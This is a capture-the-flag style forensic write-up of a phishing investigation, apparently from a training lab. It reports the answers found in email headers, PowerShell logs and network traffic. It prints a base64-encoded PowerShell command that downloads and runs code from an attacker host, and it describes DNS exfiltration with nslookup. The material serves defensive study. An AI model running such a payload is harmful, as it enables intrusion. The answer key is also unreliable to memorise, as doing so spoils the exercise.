# Boogeyman 1

### [Email Analysis] Look at that headers!
- What is the email address used to send the phishing email?<br />
Open the email using thunderbird: <br />
![image](https://github.com/user-attachments/assets/ccb71731-ce1b-42fa-8a8b-762756d3e6fb)<br />
`agriffin@bpakcaging.xyz`
- What is the email address of the victim?<br />`julianne.westcott@hotmail.com`
- What is the name of the third-party mail relay service used by the attacker based on the DKIM-Signature and List-Unsubscribe headers?<br />
![image](https://github.com/user-attachments/assets/be4d4d7d-7cf2-4033-ac80-73e9699a793c)<br />
`elasticemail.com`
- What is the name of the file inside the encrypted attachment?<br />
Download the attached zip to get the answer: `Invoice_20230103.lnk`
- What is the password of the encrypted attachment?<br /> `Invoice2023!`
- Based on the result of the lnkparse tool, what is the encoded payload found in the Command Line Arguments field?<br />
Extract the .lnk file, open a terminal on the desktop and run `lnkparse Invoice_20230103.lnk`:<br />
`aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==`

### [Endpoint Security] Are you sure that’s an invoice?
- What are the domains used by the attacker for file hosting and C2? Provide the domains in alphabetical order. (e.g. a.domain.com,b.domain.com)<br />
The command that worked for me is `cat powershell.json | jq '{ScriptBlockText}' | grep .xyz`:<br />
![image](https://github.com/user-attachments/assets/d3578725-9c06-49c4-a4da-362b40292b7e)<br />
`cdn.bpakcaging.xyz,files.bpakcaging.xyz`
- What is the name of the enumeration tool downloaded by the attacker?<br />
For this one I looked at the hint and found it on the list of commands run, that can be displayed with `cat powershell.json | jq '{ScriptBlockText}'`<br />
![image](https://github.com/user-attachments/assets/dfe1836c-550b-4773-996d-46a4623dac77)<br />
`seatbelt`
- What is the file accessed by the attacker using the downloaded sq3.exe binary? Provide the full file path with escaped backslashes.<br />
The following command will help me answer the following questions: `cat powershell.json | jq '{ScriptBlockText}' | sort | uniq` it prints all the executed commands that are unique. 
`C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite`
- What is the software that uses the file in Q3?<br /> `Microsoft Sticky Notes`
- What is the name of the exfiltrated file?<br />
![image](https://github.com/user-attachments/assets/7bb9db86-e6c1-4150-849d-c5ce8bdd5274)<br />
`protected_data.kdbx`
- What type of file uses the .kdbx file extension?<br />
Needed to google for this one: `keepass`
- What is the encoding used during the exfiltration attempt of the sensitive file?<br />
![image](https://github.com/user-attachments/assets/dc335f6a-27b6-4be8-af3d-2ca271ede19f)<br />
`hex`
- What is the tool used for exfiltration?<br />
`nslookup`

### [Network Traffic Analysis] They got us. Call the bank immediately!
- What software is used by the attacker to host its presumed file/payload server?<br />
We know that the C2 host is `files.bpakcaging.xyz`, So I opened the .pcap file on wireshark and filtered for `http contains "files.bpakcaging.xyz"`, and followed the HTTP stream: <br />
![image](https://github.com/user-attachments/assets/a0e91745-5523-4068-affb-aa9dc5496e3e)<br />
`python`
- What HTTP method is used by the C2 for the output of the commands executed by the attacker?<br /> `POST`
- What is the protocol used during the exfiltration activity?<br /> `dns`
- What is the password of the exfiltrated file?<br /> `%p9^3!lL^Mz47E2GaT^y`
- What is the credit card number stored inside the exfiltrated file?<br /> `4024007128269551`
